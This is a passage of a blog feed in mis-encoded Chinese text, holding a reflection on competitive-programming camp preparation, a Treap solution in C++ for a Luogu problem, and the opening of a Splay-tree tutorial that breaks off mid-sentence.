      <link href="/2018/02/28/%E6%B4%9B%E8%B0%B7%E5%86%AC%E4%BB%A4%E8%90%A5%E9%9A%8F%E6%83%B3/"/>
      <url>/2018/02/28/%E6%B4%9B%E8%B0%B7%E5%86%AC%E4%BB%A4%E8%90%A5%E9%9A%8F%E6%83%B3/</url>
      
        <content type="html"><![CDATA[<p>æ´›è°·æ˜¥ä»¤è¥ç»“æŸä¸ä¹…ï¼Œå°±æˆ‘ä¸ªäººè€Œè¨€å®åœ¨æ˜¯æ”¶ç›Šè‰¯å¤šã€‚<br>è¯¾åä¸æ´›è°·çš„è®²å¸ˆä»¬ç•¥æœ‰äº¤è°ˆï¼Œå¹¶ä¸”ç¨å¾®æ¥è§¦äº†åˆ«åœ°çš„ä¿¡ç«ç”Ÿï¼Œé¡¿æ„Ÿå¼±å°â€¦â€¦å†³å®šæŠŠä¸€äº›äº†è§£åˆ°çš„ä¿¡æ¯å’Œæ„Ÿæƒ³æ”¾åœ¨è¿™é‡Œã€‚æ¯”è¾ƒæ‚ï¼Œå°†å°±ç€çœ‹å§ã€‚  </p><hr><p>é¦–å…ˆè¯´ä¸‹è¿‘å¹´ç«èµ›çš„å‘å±•å§ã€‚<br>è¿‘å¹´ä¿¡æ¯å­¦ç«èµ›å¸¦æ¥çš„å‡å­¦ä¼˜åŠ¿å¢å¤§äº†ä¸å°‘ï¼Œæœºä¼šå¢åŠ äº†ï¼Œè¿™æ˜¯å¥½äº‹ã€‚ä½†è¿™åŒæ ·ä¹Ÿæ„å‘³ç€ç«äº‰å°†æ¿€çƒˆè®¸å¤šã€‚<br>ä¸¾å‡ ä¸ªä¾‹å­ï¼š  </p><ul><li>æµ™æ±Ÿå°å­¦ä¾¿åŸ¹è‚²â€œç§å­é€‰æ‰‹â€ï¼Œæµ™æ±Ÿåˆèµ›åˆ†æ•°çº¿ä¸€åº¦è¾¾åˆ°90åˆ†ã€‚  </li><li>è‘—åçš„å—å±±ä¸­å­¦ï¼ŒCç±»ä¹°ä¸åœï¼Œæ­¤å¤„ä¸ç»†è¯´ã€‚  </li><li>å¾ˆå¤§ä¸€éƒ¨åˆ†é€‰æ‰‹ä»¥å®Œå…¨åœè¯¾å¤‡æˆ˜æ¯”èµ›ã€‚</li></ul><p>åˆ‡å®å‚ä¸åˆ°ç«èµ›ä¸­ï¼Œèƒ½æ„Ÿè§‰åˆ°è®¸å¤šå­¦æ ¡å·²ç»ä¸ºæ­¤ç–¯ç‹‚äº†ã€‚ç©¶å…¶åŸå› æ˜¯ç­¾çº¦æœºä¼šå˜å¤šäº†ã€‚  </p><ul><li>NOIPè·å¾—æé«˜åˆ†æœ‰å‡ ç‡æå‰ç­¾  </li><li>å†¬ä»¤è¥&#x2F;å¤ä»¤è¥ï¼ˆWC&#x2F;SCï¼‰  </li><li>APIO  </li><li>çœé€‰  </li><li>NOI  </li><li>â€¦â€¦</li></ul><p>C9å¤§å­¦ç«ç›¸ç”©å‡ºäº†ä¸å°‘ä¸€æœ¬çº¿å½•å–çš„çº¦ã€‚ç›¸æ¯”äºè£¸è€ƒçœTOP100ï¼ˆç¦å»ºï¼‰æ‰æœ‰å¸Œæœ›è¿›PKU&#x2F;THUï¼Œé™è‡³ä¸€æœ¬çº¿å½•å–æ— ç–‘æ˜¯æ·å¾„ã€‚éš¾æ€ªä¼—å¤šå­¦æ ¡ä¸ºå…¶â€œç–¯ç‹‚â€â€¦â€¦<br>åœ¨æˆ‘çœ‹åˆ°äº†é›…ç¤¼ä¸­å­¦ã€å—å±±ä¸­å­¦ã€ç¦å¸ˆå¤§é™„ä¸­ã€ç¦å·ä¸‰ä¸­ã€é•¿éƒ¡ä¸­å­¦ã€æ­å·äºŒä¸­ç­‰ç­‰å¼ºæ ¡çš„æˆç»©åï¼Œæˆ‘æ‰å‘ç°æˆ‘ä»¬å·²ç»è½åå¤ªå¤šäº†ã€‚å¥½åœ¨åˆä¸€èµ·æ­¥ï¼Œç°åœ¨å†²åˆºè¿˜æœ‰å¾ˆå¤§å¸Œæœ›ã€‚  </p><hr><p>äºæ˜¯è¦æ³¨æ„ä»€ä¹ˆå‘¢ï¼Ÿ  </p><ol><li>æŒä¹‹ä»¥æ’çš„ç»ƒä¹ ã€‚ä¸­è€ƒåœ¨å³ï¼Œè®¸å¤šäººå®Œå…¨å°†C++ç”©å¼€ï¼Œå…¨åŠ›å¤‡æˆ˜ä¸­è€ƒã€‚ä¸ªäººè®¤ä¸ºæ­¤ä¸¾ä¸å¦¥ã€‚ä¸­è€ƒåœ¨6æœˆä¸‹æ—¬ï¼Œç„¶è€Œ11æœˆä»½ä¾¿æ˜¯æ–°ä¸€æ¬¡NOIpäº†ã€‚å¦‚æœ3æœˆ~6æœˆæ•´æ•´ä¸€ä¸ªå­£åº¦ä¸å†™ä»£ç ï¼Œç»å¯¹ä¼šæ‰‹ç”Ÿäº†ã€‚æ­¤æ—¶æƒ³è¦å›åˆ°ä»å‰çš„çŠ¶æ€å¯èƒ½è¦å¾ˆä¹…ã€‚å› æ­¤å­¦ä¸šå‹åŠ›ä¸å¤§çš„å¯ä»¥è€ƒè™‘æ¯å¤©æŠ½å‡ºæ—¶é—´æƒ³é¢˜ã€åšé¢˜ï¼Œå‘¨æœ«æ‰“æ¯”èµ›ã€‚å­¦ä¹ æˆç»©ä¸ç”šç¨³å®šçš„ï¼Œæ¯å‘¨ä¹Ÿåº”è¯¥åšä¸ª2ã€3é¢˜ï¼Œä¿æŒæ„Ÿè§‰ã€‚å…¶å®ç°åœ¨çœ‹æ¥æˆ‘ä»¬åªå‰©ä¸‹2æ¬¡NOIpçš„æœºä¼šäº†ï¼Œå¿…é¡»å¥½å¥½æŠŠæ¡ã€‚  </li><li>æœ‰æ˜ç¡®çš„TODO-Listã€‚ä¿¡æ¯å­¦çŸ¥è¯†ç‚¹æ¯”è¾ƒç¹æ‚ï¼Œéš¾åº¦å·®å¼‚å¤§ï¼Œå„ç§ç®—æ³•ã€æ•°æ®ç»“æ„æ¯”èµ›å‡ºç°é¢‘ç‡å·®è·æ‚¬æ®Šã€‚äºæ˜¯åœ¨å­¦ä¹ å®ŒæŸäº›å†…å®¹ä¹‹åï¼Œé‡ç‚¹ã€çƒ­ç‚¹è¶çƒ­æ‰“é“ï¼Œç®€å•çš„è¿ç”¨å‡ æ¬¡ã€‚ä½†æ˜¯å­¦ä¹ ä»€ä¹ˆå‘¢ï¼Ÿå¯ä»¥å‚è€ƒã€Šç®—æ³•ç«èµ›å…¥é—¨ç»å…¸â€”â€”è®­ç»ƒæŒ‡å—ã€‹çš„ç›®å½•ã€‚åˆ—å‡ºæ¸…å•ï¼Œé€ä¸€å‡»ç ´ï¼Œæ­¤æ—¶å†å»åˆ·ç»¼åˆé¢˜ï¼Œæ•ˆæœä¸€å®šå¥½ä¸å°‘ã€‚  </li><li>å¤šæ‰“æ¯”èµ›ã€‚ä¸€æ¬¡æ¬¡çš„æ¯”èµ›ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç»ƒå¥½å¿ƒæ€ï¼Œå­¦å¥½éª—åˆ†ï¼ŒæŠŠæ¡èŠ‚å¥ã€‚éšä¾¿å»é—®ä¸€ä¸ªå¤§ç‰›â€œå»å“ªé‡Œæ‰“æ¯”èµ›å¥½ï¼Ÿâ€ï¼Œ95%çš„éƒ½ä¼šå‘Šè¯‰ä½ ï¼šCodeforcesã€‚å…¶ç‰¹è‰²çš„èµ›åˆ¶å¾ˆèƒ½è¾¾åˆ°ä»¥ä¸Šç›®çš„ã€‚å¦‚æœæ²¡ç©ºæ€ä¹ˆåŠå‘¢ï¼ˆCFæ¯”èµ›å¤šåœ¨æ·±å¤œï¼‰ï¼Ÿå¯ä»¥æ‰“æ´›è°·çš„æœˆèµ›ï¼Œç»è¿‡å®¡æ ¸çš„å…¬å¼€èµ›ã€‚å¹³å¸¸åšé¢˜æ—¶ï¼Œå¯¹äºæ¯é“é¢˜ï¼Œéƒ½åº”è¯¥ä½¿åŠ²åŠ¨è„‘ï¼Œè¯•ç€å»ä½¿åŠ²éª—åˆ†ï¼Œçœ‹çœ‹èƒ½å¾—åˆ°å¤šå°‘ï¼ˆä¼˜ç§€çš„éª—åˆ†å¾€å¾€èƒ½æ‹¿åˆ°70åˆ†ä»¥ä¸Šï¼Œéå¸¸é‡è¦ï¼æ¯”å¦‚æ¨¡æ‹Ÿé€€ç«ã€çˆ¬å±±ç®—æ³•ï¼‰ã€‚ä¹‹åè¯•å›¾ç¼–å†™æ­£è§£ï¼Œ30minæ²¡æœ‰æ˜ç¡®æ€è·¯ï¼Œå†å»çœ‹é¢˜è§£ã€‚  </li><li>æ‡‚å¾—æ€»ç»“å¥—è·¯ã€‚å°¤å…¶æ˜¯DPçŠ¶æ€è®¾è®¡ã€DPä¼˜åŒ–ã€æœç´¢å‰ªæâ€¦â€¦ç­‰ç­‰ã€‚åˆ·é¢˜å¤šäº†è‡ªç„¶æœ‰ç»éªŒï¼Œä½†æ˜¯è¦å–„äºæ€»ç»“ã€‚  </li><li>å¤šæ¥è§¦ä»–åœ°å¸‚çš„é€‰æ‰‹ã€ç¥çŠ‡ï¼Œä»–ä»¬ä¼šå¾ˆä¹æ„å¸®åŠ©çš„ã€‚ä½ ç”šè‡³å¯ä»¥è¿…é€Ÿçš„å¾—åˆ°çŸ­æœŸè®¡åˆ’ã€å¤§é‡å†…éƒ¨ææ–™â€¦â€¦  </li><li>â€¦â€¦</li></ol><hr><p>ç«èµ›å…·ä½“å†…å®¹ç›¸å…³ï¼š<br>è”èµ›å¸¸è€ƒï¼š<br><img src="https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180228225459264-75959639.png">  </p><p>æ¨¡æ‹Ÿé¢˜å¤šæ˜¯ç†æ‰€å½“ç„¶ã€‚ä½†æ˜¯DPçš„ä½ç½®å¦‚æ­¤é‡è¦ä¹‹å‰ç¡®å®æ²¡æƒ³åˆ°ï¼ŒDPå¾ˆçœ‹åˆ·é¢˜é‡ã€‚æ•°è®ºéœ€è¦ä¸€å®šçš„çŸ¥è¯†ç§¯ç´¯ï¼Œåˆä¸­ç”Ÿå­¦èµ·æ¥å¯èƒ½è¾ƒéš¾ï¼Œä½†æ˜¯ç®€å•çš„æ‰‹åŠ¨æ‰¾è§„å¾‹å¾ˆæœ‰å¸®åŠ©ã€‚å¤§éƒ¨åˆ†æ¯”èµ›æœç´¢æšä¸¾æš´åŠ›å†™çš„å¥½ï¼Œå‰ªæå‰ªå¾—å¤šå°±èƒ½ç›´æ¥Auã€‚ç»ƒå¥½åŸºæœ¬åŠŸå¾ˆé‡è¦ï¼ˆæ‰€ä»¥å¤šæ‰“æ¯”èµ›ï¼ï¼‰ã€‚<br>è®¡ç®—å‡ ä½•åœ¨çœé€‰ã€NOIä¸­è€ƒçš„è¾ƒå¤šï¼Œä¸å¯ä¸å­¦ã€‚ä¸‰ç»´å‡ ä½•ä»€ä¹ˆçš„å°±ç®—äº†å§ç›®å‰â€¦â€¦<br>å­¦ä¼šé™æ€è°ƒè¯•ã€‚å…ˆåˆ«æ€¥ç€è¾“å‡ºä¸­é—´å˜é‡ï¼Œè‚‰çœ¼å…ˆä»”ç»†æ‰¾æ‰¾æœ‰æ²¡æœ‰é”™è¯¯ï¼Œè€ƒåœºè¿™æ ·èƒ½æœ‰æ•ˆæé«˜æ•ˆç‡ï¼Œé˜²æ­¢å¿ƒæ€å´©ã€‚<br>æœç´¢æšä¸¾ä½¿åŠ²å‰ªæï¼Œä¿è¯ç»“æœæ­£ç¡®çš„æƒ…å†µä¸‹å¹¶ä¸”æœ‰å……è¶³æ—¶é—´ä½¿åŠ²å¸¸æ•°ä¼˜åŒ–ã€‚ç«èµ›ä¸­ï¼Œå¥½çš„å¸¸æ•°ä¼˜åŒ–æœ‰æ—¶èƒœè¿‡ç†è®ºå¤æ‚åº¦ä¸‹é™ä¸€ä¸ªç­‰çº§ã€‚<br>å…ˆå†™æš´åŠ›ï¼Œå†å†™ä¸€èˆ¬æ­£è§£ã€‚è¿™æ ·è¿˜å¯ä»¥æ‹¿ç€2ä¸ªç¨‹åºæŒ‚åå°å¯¹æ‹ï¼Œæ—¢ä¿è¯äº†åŸºç¡€å¾—åˆ†ï¼Œåˆä¸ºæ•ˆç‡æ›´é«˜çš„æ–¹æ³•æä¾›äº†æ­£ç¡®æ€§ä¿éšœã€‚æ³¨æ„è¾¹ç•Œæ•°æ®æ‰‹åŠ¨æ£€éªŒã€‚<br>æŠ€å·§å¯èƒ½æœ‰è®¸å¤šè®¸å¤šï¼Œæ­¤å¤„æ˜¯è¯´ä¸å®Œçš„ã€‚åœ¨æ­¤æ¨èå‡ ä¸ªç½‘ç«™ï¼š<br>Codeforces.com<br>hzwer.com<br>é¡ºå¸¦ä¸€æï¼Œæ´›è°·çš„é¢˜è§£å¸¸å¸¸è®²çš„æ¯”åšå®¢è¿˜å¥½â€¦â€¦<br>ä¿¡æ¯å­¦ç«èµ›è´µåœ¨åšæŒï¼Œæ²¡æœ‰é¢˜é‡ä¸€åˆ‡éƒ½æ˜¯ç©ºè°ˆï¼Œåœ¨æœºæˆ¿é‡Œæ‰“æ¸¸æˆã€é€›çŸ¥ä¹éƒ½æ˜¯ä¸å¦¥çš„ã€‚<br>æ—¶é—´ä¸å¤šäº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ´›è°·:P2234  [HNOI2002]è¥ä¸šé¢ç»Ÿè®¡</title>
      <link href="/2018/02/27/%E6%B4%9B%E8%B0%B7P2234%20%20%5BHNOI2002%5D%E8%90%A5%E4%B8%9A%E9%A2%9D%E7%BB%9F%E8%AE%A1/"/>
      <url>/2018/02/27/%E6%B4%9B%E8%B0%B7P2234%20%20%5BHNOI2002%5D%E8%90%A5%E4%B8%9A%E9%A2%9D%E7%BB%9F%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>åŸé¢˜åœ°å€ï¼š<a href="//www.luogu.org/problemnew/show/P2234">https://www.luogu.org/problemnew/show/P2234</a></p><h3 id="é¢˜ç›®ç®€è¿°"><a href="#é¢˜ç›®ç®€è¿°" class="headerlink" title="é¢˜ç›®ç®€è¿°"></a>é¢˜ç›®ç®€è¿°</h3><p>ç»™å®šä¸€ä¸ªåºåˆ—ï¼Œå¯¹äºæ¯ä¸€ä¸ªæ•°éƒ½è¦æŸ¥è¯¢ï¼šåºåˆ—ä¸­åœ¨è¿™ä¸ªæ•°å‰ä¸è¿™ä¸ªæ•°æœ€æ¥è¿‘çš„æ•°æ˜¯ä»€ä¹ˆï¼Ÿç„¶åå°†æœ€æ¥è¿‘çš„æ•°å­—ä¸è¿™ä¸ªæ•°å­—çš„å·®ç´¯åŠ ã€‚ï¼ˆåºåˆ—ç¬¬ä¸€ä¸ªæ•°å­—ç›´æ¥åŠ è‡ªå·±ï¼‰  </p><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>æŸ¥è¯¢åœ¨è¿™ä¸ªæ•°ä¹‹å‰ä¸è¿™ä¸ªæ•°æœ€æ¥è¿‘çš„æ•°ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°ç”¨äºŒå‰æœç´¢æ ‘ï¼ˆBSTï¼‰æ¥åšã€‚<br><del>è™½ç„¶æ•°æ®ç•¥æ°´æš´åŠ›æ’åºæ¯æ¬¡æŸ¥è¯¢ä»ä¸€ä¸ªæ•°å¾€å·¦å³æ‰¾ä¹Ÿèƒ½è¿‡ã€‚</del><br>æ¯æ¬¡æ’å…¥ä¸€ä¸ªæ•°å­—ï¼Œç„¶åæŸ¥è¯¢ï¼Œæˆ‘ç”¨Treapå®ç°ï¼ˆè¿˜æ˜¯å¼±åŒ–ç‰ˆçš„ï¼Œåªæœ‰æ’å…¥æŸ¥è¯¢ï¼‰ã€‚<br>Treapçš„æ ¸å¿ƒå…¶å®å°±æ˜¯æ‰“ä¹±é¡ºåºæ’å…¥é˜²æ­¢è¢«å¡ï¼ˆç²—ç³™ç†è§£ï¼‰ã€‚å…·ä½“å®ç°æ–¹æ³•ä¸éš¾ï¼Œè¯·ç™¾åº¦ã€‚ï¼ˆæˆ‘ä¹‹åä¼šå†™ä¸€ç¯‡ä¸“é—¨ä»‹ç»ä¸‹å„ç§BSTçš„ã€‚ï¼‰<br>PSï¼šTreapæ ‘å®Œæ•´ç‰ˆä¹‹åå†™ã€‚è¿™é¢˜ç”¨STLçš„vectorä¹Ÿè¡Œï¼Œvectorç†è®ºæ¯æ¬¡æ’å…¥æ¸è¿›æ—¶é—´å¤æ‚åº¦æ˜¯O(n)ä½†æ˜¯å¬è¯´å®é™…æ˜¯å¯¹æ•°çº§åˆ«çš„ï¼Ÿ   </p><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">randad</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> seed=<span class="number">114</span>; <span class="comment">//seedå¯ä»¥éšä¾¿å–</span></span><br><span class="line">    <span class="keyword">return</span> seed=<span class="built_in">int</span>(seed*<span class="number">48271LL</span>%<span class="number">2147483647</span>);<span class="comment">//48271ä½¿å¾—å…¶æœ‰å®Œå…¨å‘¨æœŸï¼Œå³2147483647å†…å–éä¸é‡å¤ </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Treap</span> &#123;</span><br><span class="line">    <span class="type">int</span> key,pri,son[<span class="number">2</span>];</span><br><span class="line">&#125;T[<span class="number">33333</span>];</span><br><span class="line"><span class="type">int</span> cnt=<span class="number">1</span>,rt=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(<span class="type">int</span> p,<span class="type">int</span> &amp;rt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> y=T[rt].son[p];</span><br><span class="line">    T[rt].son[p]=T[y].son[!p];</span><br><span class="line">    T[y].son[!p]=rt;</span><br><span class="line">    rt=y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ins</span><span class="params">(<span class="type">int</span> key,<span class="type">int</span> &amp;rt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(rt==<span class="number">0</span>)</span><br><span class="line">    T[rt=cnt++] = (Treap)&#123;key,<span class="built_in">randad</span>()&#125;;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> p=key&gt;T[rt].key;</span><br><span class="line">        <span class="built_in">ins</span>(key,T[rt].son[p]);</span><br><span class="line">        <span class="keyword">if</span>(T[T[rt].son[p]].pri&gt;T[rt].pri)</span><br><span class="line">        <span class="built_in">rotate</span>(p,rt);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">nowMin</span><span class="params">(<span class="type">int</span> key,<span class="type">int</span> rt)</span><span class="comment">//æŸ¥è¯¢ç°åœ¨æœ€æ¥è¿‘keyçš„æ•°</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(rt==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">666666666</span>;</span><br><span class="line">    <span class="type">int</span> res=<span class="built_in">abs</span>(key-T[rt].key);</span><br><span class="line">    <span class="keyword">if</span>(key&gt;T[rt].key) res=<span class="built_in">min</span>(res,<span class="built_in">nowMin</span>(key,T[rt].son[<span class="number">1</span>]));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key&lt;T[rt].key) res=<span class="built_in">min</span>(res,<span class="built_in">nowMin</span>(key,T[rt].son[<span class="number">0</span>]));</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> n,tot=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">        <span class="type">int</span> num;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">        <span class="keyword">if</span> (i==<span class="number">1</span>) tot+=num;</span><br><span class="line">        <span class="keyword">else</span> tot+=<span class="built_in">nowMin</span>(num,rt);<span class="comment">//rtæ˜¯å½“å‰æ ¹</span></span><br><span class="line">        <span class="built_in">ins</span>(num,rt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,tot);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Treap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ´›è°·:P3391 ã€æ¨¡æ¿ã€‘æ–‡è‰ºå¹³è¡¡æ ‘ï¼ˆSplayï¼‰</title>
      <link href="/2018/02/22/%E6%B4%9B%E8%B0%B7P3391%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%96%87%E8%89%BA%E5%B9%B3%E8%A1%A1%E6%A0%91%EF%BC%88Splay%EF%BC%89/"/>
      <url>/2018/02/22/%E6%B4%9B%E8%B0%B7P3391%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%96%87%E8%89%BA%E5%B9%B3%E8%A1%A1%E6%A0%91%EF%BC%88Splay%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>åŸé¢˜åœ°å€:<a href="//www.luogu.org/problemnew/show/P3391">https://www.luogu.org/problemnew/show/P3391</a>  </p><h3 id="é¢˜ç›®ç®€è¿°"><a href="#é¢˜ç›®ç®€è¿°" class="headerlink" title="é¢˜ç›®ç®€è¿°"></a>é¢˜ç›®ç®€è¿°</h3><p>æ‚¨éœ€è¦å†™ä¸€ç§æ•°æ®ç»“æ„ï¼ˆå¯å‚è€ƒé¢˜ç›®æ ‡é¢˜ï¼‰ï¼Œæ¥ç»´æŠ¤ä¸€ä¸ªæœ‰åºæ•°åˆ—ï¼Œå…¶ä¸­éœ€è¦æä¾›ä»¥ä¸‹æ“ä½œï¼š<br>ç¿»è½¬ä¸€ä¸ªåŒºé—´ï¼Œä¾‹å¦‚åŸæœ‰åºåºåˆ—æ˜¯5 4 3 2 1ï¼Œç¿»è½¬åŒºé—´æ˜¯[2,4]çš„è¯ï¼Œç»“æœæ˜¯5 2 3 4 1</p><hr><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>Splayæ˜¯ä¸€ç§äºŒå‰æœç´¢æ ‘ã€‚å¦‚æœä¸çŸ¥é“çš„è¯â€¦â€¦    </p><p><img src="https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180223172651966-1911354100.png" alt="ç™¾åº¦å•Š"><br>ç™¾åº¦ç™¾ç§‘å¯¹BSTçš„ä»‹ç»ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">äºŒå‰æŸ¥æ‰¾æ ‘ï¼ˆBinary Search Treeï¼‰ï¼Œï¼ˆåˆï¼šäºŒå‰æœç´¢æ ‘ï¼ŒäºŒå‰æ’åºæ ‘ï¼‰å®ƒæˆ–è€…æ˜¯ä¸€æ£µç©ºæ ‘ï¼Œæˆ–è€…æ˜¯å…·æœ‰ä¸‹åˆ—æ€§è´¨çš„äºŒå‰æ ‘ï¼š è‹¥å®ƒçš„å·¦å­æ ‘ä¸ç©ºï¼Œåˆ™å·¦å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å°äºå®ƒçš„æ ¹ç»“ç‚¹çš„å€¼ï¼› è‹¥å®ƒçš„å³å­æ ‘ä¸ç©ºï¼Œåˆ™å³å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å¤§äºå®ƒçš„æ ¹ç»“ç‚¹çš„å€¼ï¼› å®ƒçš„å·¦ã€å³å­æ ‘ä¹Ÿåˆ†åˆ«ä¸ºäºŒå‰æ’åºæ ‘ã€‚</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜ç™½Splayæ¯”èµ·çº¿æ®µæ ‘èƒ½å¤šå¹²ä»€ä¹ˆï¼š</p><ul><li>å¯ä»¥åœ¨ä¸€ä¸ªæœ‰åºåºåˆ—ä¸­ä»»æ„æ•°åé¢åŠ¨æ€æ’å…¥ä¸€ä¸²æ•°ï¼ˆä¸èƒ½æ¯”aåé¢ä¸€ä¸ªæ•°è¿˜å¤§ï¼‰  </li><li>å¯ä»¥åˆ é™¤ä¸€æ®µåŒºé—´</li></ul><p>å¯èƒ½æè¿°ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œå…·ä½“çœ‹è¿™é‡Œé¢ç»™çš„è®ºæ–‡é“¾æ¥ï¼š<a href="//www.cnblogs.com/yyy2015c01/p/8457795.html">ä¿¡æ¯å­¦ç«èµ›ç›¸å…³ä¼˜ç§€æ–‡ç« åˆé›†</a><br>æˆ–è€…ç›´æ¥çœ‹è¿™é‡Œï¼š<a href="//files.cnblogs.com/files/yyy2015c01/%E8%BF%90%E7%94%A8%E4%BC%B8%E5%B1%95%E6%A0%91%E8%A7%A3%E5%86%B3%E6%95%B0%E5%88%97%E7%BB%B4%E6%8A%A4%E9%97%AE%E9%A2%98.pdf">è¿ç”¨ä¼¸å±•æ ‘è§£å†³æ•°åˆ—ç»´æŠ¤é—®é¢˜.pdf</a><br>å¦‚æœæä¸æ‡‚å·¦æ—‹å³æ—‹æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥å…ˆçœ‹<a href="//www.cnblogs.com/yyy2015c01/p/8457795.html">ä¿¡æ¯å­¦ç«èµ›ç›¸å…³ä¼˜ç§€æ–‡ç« åˆé›†</a>é‡Œçš„AVLæ ‘ä»‹ç»ã€‚<br>å¯¹äºAVLæ ‘æ˜¯ä¸€ç§ä¸ºäº†é˜²æ­¢æ ‘ç»“æ„ä¸å¤Ÿä¼˜å¯¼è‡´æ·±åº¦è¿‡æ·±æ—¶é—´å¤æ‚åº¦é€€åŒ–ï¼Œåœ¨ä¿æŒäºŒå‰æœç´¢æ ‘æ€§è´¨ä¸å˜çš„å‰æä¸‹è¿›è¡Œçš„ä¸€ç§å˜æ¢ã€‚ç®€å•è¯´å°±æ˜¯æŠŠå¾€ä¸€è¾¹æ²‰çš„æ ‘å¼„çš„ä¸¤è¾¹å¹³è¡¡äº›ã€‚<br>è€Œåœ¨Splayä¸­ï¼Œå°†ç‰¹å®šç‚¹æ—‹è½¬åˆ°ä¸€å®šä½ç½®å¯ä»¥è¿›è¡Œæå–åŒºé—´ç­‰æ“ä½œï¼ŒåŒæ—¶å„ç§æ—‹è½¬é—´æ¥çš„ä½¿æ ‘**åŸºæœ¬å¹³è¡¡(æ˜¯çš„ï¼Œå¯ä»¥æ„é€ æ•°æ®å¡æ‰ã€‚Treapæ ‘å¯¹æ­¤è¡¨ç¤ºåŒæƒ…)**ã€‚  </p><hr><p>å·¦æ—‹ï¼ˆä¸‹é¢ä»£ç 